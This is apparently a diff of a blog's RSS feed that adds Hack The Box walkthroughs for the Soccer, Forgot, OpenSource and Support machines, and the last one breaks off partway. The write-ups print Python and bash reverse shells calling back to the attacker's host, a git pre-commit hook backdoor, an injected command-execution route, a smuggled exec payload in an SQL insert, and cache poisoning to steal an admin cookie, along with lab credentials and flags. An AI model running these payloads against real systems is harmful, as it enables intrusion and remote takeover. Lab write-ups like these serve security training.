@@ -4,11 +4,490 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Tue, 28 Feb 2023 17:52:54 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 06 Mar 2023 17:12:51 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
         <item>
-            <title><![CDATA[Ambassador redux]]></title>
+            <title><![CDATA[HTB soccer]]></title>
+            <guid>ed425196585240789bf0f19c4670322a</guid>
+            <pubDate>Fri, 03 Mar 2023 03:12:39 GMT</pubDate>
+            <content:encoded><![CDATA[<p>We start with nmap:<br />
+nmap -sV -sC -oA nmap/intial 10.10.11.194</p>
+<p><img src="/_resources/f5c0a3f5c4a34a45b25fbb00934974a1.png" /></p>
+<p>The nmap scan tells us the name of the page is soccer.htb so we change the /etc/hosts file</p>
+<p>We run a full scan while we go explore the page, but find no additional ports.</p>
+<p>We do a banner grab on port 9091 with a GET request:<br />
+<img src="/_resources/7e02089f74d34e979d84dd7dff7ef642.png" /></p>
+<p>The server on port 80 is running nginx 1.18.0<br />
+<img src="/_resources/c1b6c4c899e245e3a18fea7d63272cd5.png" /></p>
+<p>The page loads:<br />
+<img src="/_resources/c895ffc9363343068c4172ad713777bd.png" />!</p>
+<p>We find a /tiny subdirectory using feroxbuster:<br />
+<img src="/_resources/44cebe31e0914bcbaf7ea604ce046b01.png" /></p>
+<p>There we have a login portal:<br />
+<img src="/_resources/b0176b5c96b44472ab3a54d4eb73648f.png" /></p>
+<p>We can see this is tinyfilemanager version 2.4.3<br />
+<img src="/_resources/1d4c5e2c27064c47b91c3298f9bd8896.png" /></p>
+<p>A quick search tells us we can expoit this service:<br />
+<a title="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit" href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit">https://github.com/febinrev/tinyfilemanager-2.4.3-exploit</a></p>
+<p>Using the admin creds in the example exploit admin:admin@123 we are able to autheniticate, which means this is a vulnerable version.<br />
+<img src="/_resources/8458caeafe85467697734079697b73ba.png" /><br />
+<img src="/_resources/1d2543be7cd0464eae04843062aeaaed.png" /></p>
+<p>We can upload our own webshell manually:<br />
+<img src="/_resources/13acead1696f4069a464d807f874522b.png" /></p>
+<p>We navigate to the uploads folder on the site and find our shell.<br />
+<a title="http://soccer.htb/tiny/uploads/foil.php?cmd=id" href="http://soccer.htb/tiny/uploads/foil.php?cmd=id">http://soccer.htb/tiny/uploads/foil.php?cmd=id</a><br />
+<img src="/_resources/2e8e3dc5eba24e588078138ba90901ac.png" /></p>
+<p>Our webshell disappears rather quickly so we need to try using a php reverse shell file rather than a webshell.</p>
+<p>We get a reverse shell:<br />
+<img src="/_resources/ad8206a47c724153b42b034783964d70.png" /><br />
+We see that there is a user, player:<br />
+<img src="/_resources/07e5df22a044466097cf652d465fc6dd.png" /><br />
+uname -a tells us:<br />
+Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>We read the tinyfilemanager.php file and see only two users:<br />
+<img src="/_resources/71a50e8af8114ad6827d0ce58e33dcd2.png" /></p>
+<p>We see a subdomain in /etc/nginx/sites-enabled:<br />
+<img src="/_resources/ddc34c07d76a4ce7a4adf3d8c84e47de.png" /><br />
+We read that the site is running on port 3000<br />
+<img src="/_resources/36fd0e7b1a1c4e18bad29073d1a5f48c.png" /></p>
+<p>The site is only running on the localhost, so we can try using chisel to run it on our machine:<br />
+We start chisel on our machine:<br />
+./chisel64 server -p 8001 --reverse<br />
+On the target we use:<br />
+./chisel64 client 10.10.14.10:8001 R:socks</p>
+<p>The site loads once we use our socks5 proxy through FoxyProxy:<br />
+<img src="/_resources/635dfb7790ba4439b43d26fe0e2a1d73.png" /></p>
+<p>We create an account:<br />
+<img src="/_resources/581503543a874eb1b2847578feedba33.png" /></p>
+<p>We look at the source code and see that the site is running a websocket:<br />
+<img src="/_resources/87bdf3138b7e4b25b84860c6d6910565.png" /></p>
+<p>We can use the script here to direct requests back to our machine:<br />
+<a title="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</a><br />
+We modify the script to change the socket to the socket we found in the source code:<br />
+<img src="/_resources/b18073985a624dfd8522403c01df9af8.png" /></p>
+<p>We run the script and then run sqlmap:<br />
+sqlmap -u "<a title="http://localhost:8081/?id=1" href="http://localhost:8081/?id=1">http://localhost:8081/?id=1</a>" -p "id"</p>
+<p>The id paramater is injectable, so we dump the database:<br />
+<img src="/_resources/6d0c6eea7d424669965bd471a8fe66a9.png" /></p>
+<p>We get credentials:<br />
+<img src="/_resources/3f844a5231f94a699401450041e980c8.png" /></p>
+<p>We can try to use these on ssh:<br />
+player:PlayerOftheMatch2022</p>
+<p>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" player@soccer.htb</p>
+<p>They work and we get the user.txt:<br />
+<img src="/_resources/178908e3c7784aedad3cbeac7a71664e.png" /><br />
+5a1c2b1cfc34b0860c365e9780ad7624</p>
+<p>We run the command to check for suid binaries and find an unusual binary:<br />
+find / -perm -u=s -type f 2&gt;/dev/null<br />
+<img src="/_resources/b751c839c7b24ca98f56deaca3954080.png" /></p>
+<p>We read the configuration file for doas and find an interesting entry.<br />
+cat /usr/local/etc/doas.conf<br />
+<img src="/_resources/b559ae47f6c4423bbc75d267218e06c5.png" /></p>
+<p>According to this reference, if we are allowed to run as sudo, we can execute a python file as root.<br />
+<a title="https://gtfobins.github.io/gtfobins/dstat/" href="https://gtfobins.github.io/gtfobins/dstat/">https://gtfobins.github.io/gtfobins/dstat/</a></p>
+<p>We can create a reverse shell python script and execute is using the following command:</p>
+<p>doas -u root /usr/bin/dstat --filename</p>
+<p>we make a reverse shell called dstat_banana.py in the /usr/local/share/dstat folder</p>
+<p>import socket,subprocess,os;<br />
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br />
+s.connect(("10.10.14.10”,1337));</p>
+<p>os.dup2(s.fileno(),0);<br />
+os.dup2(s.fileno(),1);<br />
+os.dup2(s.fileno(),2);</p>
+<p>import pty; pty.spawn(“/bin/bash”)</p>
+<p><img src="/_resources/7121f55167ac4a3eb432e21ec485e86c.png" /></p>
+<p>Then we run:<br />
+doas -u root /usr/bin/dstat --banana</p>
+<p><img src="/_resources/db11a269c5654b32a3078c2a899a67af.png" /></p>
+<p>We get our root shell and grab the root.txt:</p>
+<p><img src="/_resources/147786b8413842cc8df999951305e14f.png" /></p>
+<p>9da0fd47bd42fcdbed86727e7586973e</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[HTB forgot]]></title>
+            <guid>5cde7c764b7e40b097e95f28f14c8fda</guid>
+            <pubDate>Thu, 02 Mar 2023 03:51:09 GMT</pubDate>
+            <content:encoded><![CDATA[<p>We start with an nmap scan:<br />
+nmap -sV -sC -oA nmap/intial 10.10.11.188<br />
+<img src="/_resources/082cadf136094aa9bb681ec28f56b69d.png" /></p>
+<p>We add the machine to our /etc/hosts file and then visit the site on port 80:</p>
+<p><img src="/_resources/e86926068ca24f8a9665988eff03e9d7.png" /></p>
+<p>We have a login screen with many cookies:</p>
+<p><img src="/_resources/1813a948472d4ef5b6e3769a160397b1.png" /></p>
+<p>There is also something strange in the requests the nmap scan output:<br />
+Via: 1.1 varnish (Varnish/6.2)</p>
+<p>We run nikto and wait to see what it pulls before attempting to run gobuster or feroxbuster.<br />
+Nikto gave nothing, and we try feroxbuster:<br />
+<img src="/_resources/ec746a33e9c04d54bfaac0abe49cfd5c.png" /></p>
+<p>Meanwhile, we can play with the login form.</p>
+<p>We try the forgot password function and enter admin. We get an error:<br />
+<img src="/_resources/84732728bf7243488b6f8052887cf7a5.png" /></p>
+<p>The reset page loads, but whatever we input gives us an invalid token error.</p>
+<p>Looking at the source code, we find a username:<br />
+<img src="/_resources/26d4289ec0c641e9bd3699403628d220.png" /></p>
+<p>robert-dev-14329<br />
+Someone made a python script for this box, but the hint we needed was that the username that works to get the token is robert-dev-36712<br />
+<img src="/_resources/76f6e39dee044fb89550cd829f2249b6.png" /></p>
+<p>We can experiment with this tomorrow.</p>
+<p>We login with the creds we created:<br />
+<img src="/_resources/075237878ce8473ba9fd27ca357ae00a.png" /></p>
+<p>We see a page called tickets with usernames:<br />
+<img src="/_resources/01c3ec3c15104a8e8d562475cab6b909.png" /></p>
+<p>We see another form:<br />
+<img src="/_resources/11c1616d8cf6459d90b9bac98cb002a1.png" /></p>
+<p>We learn from the post request that this is using a Jenkins service:<br />
+<img src="/_resources/f7c991f4108c4fe883980fc6c621d696.png" /></p>
+<p>We submit the form with our ip address and see what happens:<br />
+<img src="/_resources/cbbcd5a2f28547938284c75e9775588f.png" /></p>
+<p>We look at the source code and see a hidden disabled page called admin_tickets:<br />
+<img src="/_resources/ed57fb19b3af445da05a2212184d9625.png" /></p>
+<p>We try a cache poisoning attack. We will use curl commands to grab the cookies.</p>
+<p>curl -X "GET" -H "Host: 10.10.14.10:9980" <br />
+<a title="http://10.10.11.188/forgot?username=robert-dev-14329" href="http://10.10.11.188/forgot?username=robert-dev-14329">http://10.10.11.188/forgot?username=robert-dev-14329</a></p>
+<p>curl -s -o /dev/null -v -d "username=robert-dev-14329&amp;password=qwerty" <br />
+-X POST <a title="http://10.10.11.188/login" href="http://10.10.11.188/login">http://10.10.11.188/login</a></p>
+<p>We are able to grab a session cookie after logging in:<br />
+<img src="/_resources/a710eea59c814b339c0e9754fa34ec4d.png" /></p>
+<p>curl -i -d "to=Admin&amp;link=http://10.10.11.188/static/blahblah.png" <br />
+-H "Cookie: session=42252835-2fd8-45bc-b355-148b28556d20;"    <br />
+-X POST <a title="http://10.10.11.188/escalate" href="http://10.10.11.188/escalate">http://10.10.11.188/escalate</a></p>
+<p>We then send a request for an escalation using the server's ip address and wait to see if there is a post:<br />
+<img src="/_resources/1003617a38914971a49e34465f6febf2.png" /></p>
+<p>curl -I <a title="http://10.10.11.188/static/blahblah.png" href="http://10.10.11.188/static/blahblah.png">http://10.10.11.188/static/blahblah.png</a><br />
+We make a request to see if the cache was poisoned, and see if we get a new admin cookie:</p>
+<p><img src="/_resources/11cc1d49283a483d85c9231fdc9e1337.png" /></p>
+<p>curl -I -H "cookie: session=46594168-eb3f-4248-a197-7143b13714ed" <a title="http://10.10.11.188/admin_tickets" href="http://10.10.11.188/admin_tickets">http://10.10.11.188/admin_tickets</a><br />
+We make a request to see the admin_tickets page with the new cookie:<br />
+<img src="/_resources/5ee319b24b8b463c8903059ea450b123.png" /></p>
+<p>Now we use the browser to visit the site with the stolen admin cookie:<br />
+<img src="/_resources/b4e03511d5df4de9a27658afe1db4b2f.png" /><br />
+Looks like we have ssh credentials:<br />
+diego:dCb#1!x0%gjq</p>
+<p>We are able to login to ssh using:<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" diego@10.10.11.188<br />
+<img src="/_resources/fa83ca9c6e1e480c9b1451fb0b86d152.png" /></p>
+<p>We run uname and find that the machine is running:<br />
+Linux forgot 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>We start looking at the box, and notice that there are some internal ports:<br />
+<img src="/_resources/0e73f7b6d6e74a77a0760bffca66d425.png" /></p>
+<p>We can see that mysql is running on port 3306.<br />
+We can try the same credentials we used to ssh into the machine.<br />
+We use mysql -u diego -p<br />
+<img src="/_resources/1090790b1fdd448dbe9bf2609b6d22e3.png" /><br />
+There was nothing particularly useful there, and that version is not vulnerable to anything we can see.</p>
+<p>We run sudo -l and find an interesting file:<br />
+<img src="/_resources/dcc8cbbb911d4149b550e07c00e97491.png" /></p>
+<p>We found a method that we can try:</p>
+<p>First get two ssh sessions.</p>
+<p>Create the /dev/shm/kk.sh script. Something like this:</p>
+<p>#!/bin/bash<br />
+bash -i &gt;&amp; /dev/tcp/10.0.0.1/4443 0&gt;&amp;1</p>
+<p>chmod 777 kk.sh<br />
+<img src="/_resources/a49001d1d148487c9ce3ad6dffa3a0a4.png" /><br />
+Read the database creds from /opt/security/ml_security.py and log in to the database. Run these:</p>
+<p>use app;</p>
+<p>insert into escalate values ("lol","lol","lol",'hello=exec("""\nimport<br />
+os\nos.system("/dev/shm/kk.sh")\nprint("&amp;ErrMsg=%3Cimg%20src=%22http://imgur.com/bTkSe.png%22%20/%3E%3CSCRIPT%3Ealert%28%22xss%22%29%3C/SCRIPT%3E")""")');<br />
+<img src="/_resources/ac4d407f2fca48ef9f5ea1a046bc7362.png" /></p>
+<p>make listener</p>
+<p>nc -nvlp 4443</p>
+<p>On the second session just run:</p>
+<p>sudo /opt/security/ml_security.py<br />
+<img src="/_resources/0b4caf9835dd42d4a65c836539726eae.png" /></p>
+<p>We have a root shell and get the root.txt:<br />
+<img src="/_resources/a2c3e6df30054c449576d7b2b128a9ba.png" /><br />
+8d2b80b768aa54e9491cb8a2da18e6f2</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[HTB OpenSource]]></title>
+            <guid>fe2a2cfa35774e7a98e18c2334b7e350</guid>
+            <pubDate>Wed, 01 Mar 2023 19:32:58 GMT</pubDate>
+            <content:encoded><![CDATA[<p>We start with an initial nmap scan:<br />
+nmap -sV -sC -oA nmap/initial 10.10.11.164<br />
+<img src="/_resources/62ad448f408e4e01bd1d82d9b8ab939f.png" /></p>
+<p>Not sure what the service on port 3000 is, and a banner grab fails.</p>
+<p>We run a full port scan:<br />
+nmap -sV -sC -p- -oA nmap/full 10.10.11.164<br />
+<img src="/_resources/7874079ff60040a0bd5a1827f6d423b5.png" /></p>
+<p>We see a webserver running on port 80 now,<br />
+Werkzeug/2.1.2 Python/3.10.3</p>
+<p><img src="/_resources/bdffeaec5f5348f4825c254869281819.png" /></p>
+<p>We run feroxbuster:<br />
+<img src="/_resources/2a53bdea5c4641488cef508b7cbbff84.png" /><br />
+There is a console on this Werkzeug server:<br />
+<img src="/_resources/dd6edcc723ad4ea7bdb50aed0cd84f3e.png" /></p>
+<p>We know that there is a way to bypass the Pin.</p>
+<p>But we keep looking for other areas to exploit.<br />
+The download link allows us to download the source of the site as a zip file.</p>
+<p>There is also a link to an upload site:<br />
+<a title="http://10.10.11.164/upcloud" href="http://10.10.11.164/upcloud">http://10.10.11.164/upcloud</a></p>
+<p>We can see by looking through the source code, what kind of file the upload is expecting, and what is being used to parse it.<br />
+<img src="/_resources/6998f75319c44a3b8539ba3ce2a28ae7.png" /></p>
+<p>We can try to look at the code for the popper.js<br />
+Without understanding what the code is doing it's not very useful.<br />
+We check to see if there are any git logs:<br />
+git log:<br />
+<img src="/_resources/8678a29f95304e938b14566f2db93abb.png" /></p>
+<p>We run git show against the latest commit to see what we can learn:<br />
+<img src="/_resources/ad15ca48e89144ffbe771bb8abe22bc6.png" /><br />
+git branch tells us there are multiple repos:<br />
+<img src="/_resources/8227ff7dcf2c442398555971f52358ea.png" /></p>
+<p>We use the command git checkout dev to switch branches, and the run git log again:<br />
+<img src="/_resources/3716303aa6c146df9afb0fc557b168e0.png" /></p>
+<p>We can compare the differences between the first and last commit using git diff:<br />
+The main difference is the existence of a file that is not in the most recent version:<br />
+<img src="/_resources/4e23301f9c494a288ff913977a87f8f0.png" /></p>
+<p>We can load that git branch using the git checkout command again, and then read the file:<br />
+git checkout a76f8f75f7a4a12b706b0cf9c983796fa1985820<br />
+<img src="/_resources/10c381ca653941e3986df795ba746f92.png" /></p>
+<p>We may have credentials of the user who uploaded the file now:<br />
+<img src="/_resources/0628c9998eff45668b5fe57c137cc343.png" /><br />
+dev01:Soulless_Developer#2022</p>
+<p>Looking at the views.py file, that the app uses to upload files, we can see a vulnerability in the code. The os.path.join function tells the script to write a file path name on the server where the upload is going:<br />
+<img src="/_resources/5277f675f19b41f8af02bed34a57e012.png" /></p>
+<p>Because we control the filename, we may be able to use directory traversal. Looking at the utils.py file, we can see that ../ is not allowed, but when we create a file name with /file it overwrites the public/uploads directory. Essentially, we can create our own subdirectory and control it however we want.<br />
+<img src="/_resources/164365913b7a4c919f07e9cadc360428.png" /></p>
+<p>To do this, we need to modify the source code, and then upload it to the server.<br />
+If we were to modify the views.py file to include the following code, we can use python for command execution:</p>
+<p>@app.route('/run/<cmd class="jop-noMdConv">')<br />
+def run_command(cmd):<br />
+return subprocess.check_output(cmd.split(" "))</cmd></p>
+<p>We intercept the file upload through burpsuite and add our line of code to the end of the file:<br />
+<img src="/_resources/4e65994a9c99479fbd72c38b2d6d0349.png" /><br />
+<img src="/_resources/505d34f271a6467593b7947424d3a9fb.png" /></p>
+<p>We also modify the file location at the top of the request to be /app/app/views.py:<br />
+<img src="/_resources/b51584552cfc40e7ad09abf2e84810e7.png" /></p>
+<p>We have code execution:<br />
+<img src="/_resources/83b7c3574cdf42a3ab049def1a4e4293.png" /></p>
+<p>We can try to see which shell is running. We run which sh and find that /bin/sh is running.<br />
+<img src="/_resources/30fcb1683c9046448ac4879473dd2d6e.png" /></p>
+<p>Now we can try to upload a reverse shell using the following:<br />
+import socket<br />
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />
+s.connect(("10.10.14.8",80))<br />
+os.dup2(s.fileno(),0)<br />
+os.dup2(s.fileno(),1)<br />
+os.dup2(s.fileno(),2)<br />
+import pty<br />
+pty.spawn("/bin/sh")</p>
+<p><img src="/_resources/65bc626ac93b402b9d72e0acf869fb8b.png" /></p>
+<p>We add that portion to our burp request:<br />
+<img src="/_resources/6761cf625c5841678ece8a4015b8dce8.png" /></p>
+<p>We change the port to 1337, and then we get a our shell:<br />
+<img src="/_resources/9ca566c35ef74ac6b4e7f40fd8ab2ed0.png" /></p>
+<p>The shell is within the docker and we can confirm this by looking at the ip address:<br />
+<img src="/_resources/738ab5eb855e4f138aa16c922e6562fd.png" /></p>
+<p>We can try to interact with the host machine using 172.17.0.1 by running nc to banner grab port 22<br />
+<img src="/_resources/5a4677a28f8e42268d6fde0ad2bfcf69.png" /></p>
+<p>We can confirm that the service on port 3000 is a webserver by using nc to make a get request:<br />
+<img src="/_resources/0600ecdc1439418c89b25140c6752e83.png" /><br />
+We make another Get request using the Host as the ip of the host machine and get a page back with a gitea header:<br />
+<img src="/_resources/2f056ce03e4840659819f1ca05864a95.png" /></p>
+<p>We upload chisel to the box to try to connect to the service locally:<br />
+<img src="/_resources/a93c7247692d48758eb739a56e2746dc.png" /></p>
+<p>We start chisel on our machine:<br />
+./chisel64 server -p 8001 --reverse<br />
+On the target we use:<br />
+./chisel64 client 10.10.14.8:8001 R:socks<br />
+<img src="/_resources/38da83c9a74e4ef2893d554d193a5b70.png" /></p>
+<p>We see that we opened port 1080 on the target machine.<br />
+We set up a socks5 proxy on FoxyProxy:<br />
+<img src="/_resources/bc6cfb430b204da1bd3585c3551359c6.png" /></p>
+<p>Now we can view the page on port 3000:<br />
+<img src="/_resources/2d618051a9ed4db28d989c3075043c89.png" /></p>
+<p>There is a sign in page, and we can try the credentials we found earlier.<br />
+<img src="/_resources/bdf93ad82f084a0eb6f8609943f04d85.png" /></p>
+<p>We can login:<br />
+<img src="/_resources/381192a26ec3466a83cf3a04a7395765.png" /><br />
+Within the portal there is a home-backup folder with .ssh credentials:<br />
+<img src="/_resources/1d6e4c8e2c0642c2aea0e170b437ae6c.png" /></p>
+<p>We copy the key locally and then chmod 600 and run:<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa_opensource dev01@10.10.11.164</p>
+<p><img src="/_resources/377a7543e9334b1da2b624b71ea32fa5.png" /><br />
+ef8673f7f66ee54589e46ab7ed5c3c37</p>
+<p>There is a folder .git that is updated constantly:<br />
+<img src="/_resources/c9ff9af6bb2b451cad8a128e2e139030.png" /></p>
+<p>We upload pspy and run it to see what processes are taking place:<br />
+<img src="/_resources/865d7e7984f2473897d864dd881e0449.png" /><br />
+This command seems to run every minute:<br />
+<img src="/_resources/7572b4ede4d84747b661c070909bc4e7.png" /></p>
+<p>We can go look at what that file is doing.<br />
+<img src="/_resources/ee71e50e671341f8bcfcd945adb729db.png" /></p>
+<p>The file is a bash script that runs a command, and checks for changes then makes a git commit. Perhaps we can add a file in /home/dev01 that calls a reverse shell for us.</p>
+<p>We can make a script file that executes:<br />
+/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.3/31337 0&gt;&amp;1</p>
+<p>Inside the /home/dev01/.git folder there is a hooks folder that we could potentially modify since there are bash scripts there already:<br />
+<img src="/_resources/b979d7a9fa4f4cdaa0511a07e2375b3c.png" /></p>
+<p>We write to a file called pre-commit:<br />
+<img src="/_resources/eb90a71395754a2582e02fea529de3c0.png" /><br />
+We make that script executable by using chmod +x pre-commit</p>
+<p>We make a new file in the /home/dev01 folder so that the git commit will happen, and then wait to see if a shell executes.<br />
+<img src="/_resources/879d694cbc6b424e8082e27680e22ce1.png" /></p>
+<p>Now we have a root shell:<br />
+<img src="/_resources/5d7db74bbddf4f4db320af1517c8a148.png" /></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[HTB Support]]></title>
+            <guid>c51e10b43bb842cb8b372ddb2c633e3f</guid>
+            <pubDate>Tue, 28 Feb 2023 19:36:49 GMT</pubDate>
+            <content:encoded><![CDATA[<p>We start with a scan:<br />
+nmap -Pn -sC -sV -oA nmap/initial 10.10.11.174<br />
+<img src="/_resources/90a417aeaecb465e9ed5f54235e2b8c6.png" /></p>
+<p>nmap -Pn -sC -sV -p- -oA nmap/full 10.10.11.174</p>
+<p><img src="/_resources/217764dfa15a43baaad6a6a65cbc3e4d.png" /></p>
+<p>We start enumerating smb:<br />
+we use smbclient -N -L 10.10.11.174:<br />
+<img src="/_resources/1e52f415750447e8b16ddedf3f59387a.png" /></p>
+<p>Based on the ouput we gather that this is an AD Domain Controller<br />
+now we attempt to read the sares<br />
+smbclient -N <a title="//10.10.11.174/support-tools" href="//10.10.11.174/support-tools">//10.10.11.174/support-tools</a></p>
+<p><img src="/_resources/d163b0073df547eb9b64d8501e673d0f.png" /></p>
+<p>We see a list of files we can exfil<br />
+We get the UserInfo.exe.zip file:<br />
+<img src="/_resources/6eb60211b8704a8b81e82da736dd0de0.png" /><br />
+We extract the files and start to read them:<br />
+<img src="/_resources/323abd25e4b64c8898b800fe0a50ca49.png" /></p>
+<p>What we learn initially from reading these files is that this is a .NetFramework file<br />
+<img src="/_resources/44d45a4cd1fd4fd7a0080e48649dcc38.png" /><br />
+<img src="/_resources/fee3165c85f240c092fa3883ecf953d7.png" /></p>
+<p>We check to see whether we can execute this on our Kali machine:<br />
+<img src="/_resources/743f7ad731044e53bd84e3b0f3a2613a.png" /></p>
+<p>We cannot run the binary, so we download ILSpy from here:<br />
+wget <a title="https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip" href="https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip">https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip</a></p>
+<p>We unzip, and then run from the /opt/artifacts/linux-x64 dir<br />
+sudo ./ILSpy<br />
+We load the UserInfo.exe file into ILSpy:<br />
+<img src="/_resources/49da4e9765254d4b8d98a01023c61f03.png" /></p>
+<p>There are functions within this Binary that have some potentially useful information:<br />
+<img src="/_resources/496162081506455085a3b54ca687919a.png" /></p>
+<p>Apparently this executable queries the ldap server for userinfo.<br />
+We add the ip address to the /etc/hosts file.</p>
+<p>We don't have luck viewing the source code for the application with ILSpy, so we download DNSpy for Windows and run that on the native machine.<br />
+<a title="https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8" href="https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8">https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8</a><br />
+<img src="/_resources/026c4badfb5d46c6ae648aaf8dc1dce2.png" /></p>
+<p>It appears that the userinfo.exe program calls the base64 encoded and decodes it with the key "armando" to pass it to the LDAP server to validate the correct credentials:<br />
+<img src="/_resources/01147c9c2815476bbaa8c18a1c322576.png" /></p>
+<p>We can create a python script to decode the password, but more simply we can use cyberchef:<br />
+<a title="https://gchq.github.io/CyberChef/" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a><br />
+We drag 'from base64' since the encrypted piece is base64. Next we drag XOR into the recipe section, and use the key 'armando' with UTF-8 and another XOR with 223 and Decimal:<br />
+<img src="/_resources/fd2766d2a1574884a06fbdac23255ca8.png" /></p>
+<p>This gives us the user ldap password:<br />
+ldap:nvEfEK16^1aM4<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mn>7</mn><mi>A</mi><mi>c</mi><mi>l</mi><mi>U</mi><mi>f</mi><mn>8</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">e7AclUf8x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord">7</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10903em">U</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord">8</span><span class="mord mathnormal">x</span></span></span></span></span>tRWxPWO1%lmz</p>
+<p>We test the credentials using crackmapexec:<br />
+crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mn>7</mn><mi>A</mi><mi>c</mi><mi>l</mi><mi>U</mi><mi>f</mi><mn>8</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">e7AclUf8x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord">7</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10903em">U</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord">8</span><span class="mord mathnormal">x</span></span></span></span></span>tRWxPWO1%lmz'<br />
+<img src="/_resources/89f5edfa8b7c46e7952033a70ac310fc.png" /></p>
+<p>We installed mono and now are able to run the .exe file:<br />
+sudo apt-get install mono<br />
+sudo apt-get install mono-complete</p>
+<p><img src="/_resources/1e872fbb1d5c467ea9d9613dba810992.png" /></p>
+<p>We attempt to run bloodhound-python, but see that there is a domain we didn't add to the /etc/passwd file:<br />
+<img src="/_resources/5da87374e35942da86935a98c11486bb.png" /></p>
+<p>We add the entry and now the command executes:<br />
+bloodhound-python --dns-tcp -ns 10.10.11.174 -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mn>7</mn><mi>A</mi><mi>c</mi><mi>l</mi><mi>U</mi><mi>f</mi><mn>8</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">e7AclUf8x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord">7</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10903em">U</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord">8</span><span class="mord mathnormal">x</span></span></span></span></span>tRWxPWO1%lmz' -c all</p>
+<p><img src="/_resources/8bcca42d2a114bd1aba384a84c100a67.png" /></p>
+<p>We open Bloodhound and import the json files that were collected using the ptython collector.<br />
+Looking at the Unconstrained Delegation Systems tab under Analysis we see two computers that seem interesting since they appear to be non-standard machine accounts:<br />
+<img src="/_resources/5d8e3ff5a32c4d68a89e7d70d83b3038.png" /><br />
+Overall, Bloodhound is not giving us much useable information.</p>
+<p>We need to examine the users from ldap, since that account didn't show up using Bloodhound.<br />
+We tried using ldapsearch, but were unable to get any data:<br />
+ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mn>7</mn><mi>A</mi><mi>c</mi><mi>l</mi><mi>U</mi><mi>f</mi><mn>8</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">e7AclUf8x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord">7</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10903em">U</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord">8</span><span class="mord mathnormal">x</span></span></span></span></span>tRWxPWO1%lmz'<br />
+-b "dc=support,dc=htb" "*"</p>
+<p>We instead try to use the GUI based Apache Directory Studio:<br />
+<a title="https://directory.apache.org/studio/downloads.html" href="https://directory.apache.org/studio/downloads.html">https://directory.apache.org/studio/downloads.html</a></p>
+<p>We will connect the ldap:<br />
